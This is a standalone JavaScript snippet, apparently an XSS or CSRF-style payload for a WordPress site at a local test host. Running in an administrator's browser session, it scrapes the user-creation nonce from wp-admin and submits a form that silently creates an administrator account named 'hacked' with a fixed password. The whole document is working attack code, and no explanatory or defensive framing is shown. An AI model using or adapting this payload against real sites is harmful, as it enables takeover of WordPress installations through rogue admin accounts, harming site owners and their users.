(async () => {                                                                                                          
    const base = 'http://mywordpress:8080';                                                                             
    const html = await fetch(`${base}/wp-admin/user-new.php`, { credentials: 'include' }).then(r => r.text());          
    const nonce = html.match(/name="_wpnonce_create-user"\s+value="([a-f0-9]+)"/)[1];
                                                                                                                        
    const body = new URLSearchParams();
    body.set('action', 'createuser');
    body.set('_wpnonce_create-user', nonce);
    body.set('user_login', 'hacked');
    body.set('email', 'hacked@gmail.com');
    body.set('pass1', 'EoP*GNimlw8kmW8QNv@d#5MR');
    body.set('pass2', 'EoP*GNimlw8kmW8QNv@d#5MR');
    body.set('role', 'administrator');
    body.set('createuser', 'Add New User');

    await fetch(`${base}/wp-admin/user-new.php`, {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body,
    });
  })();
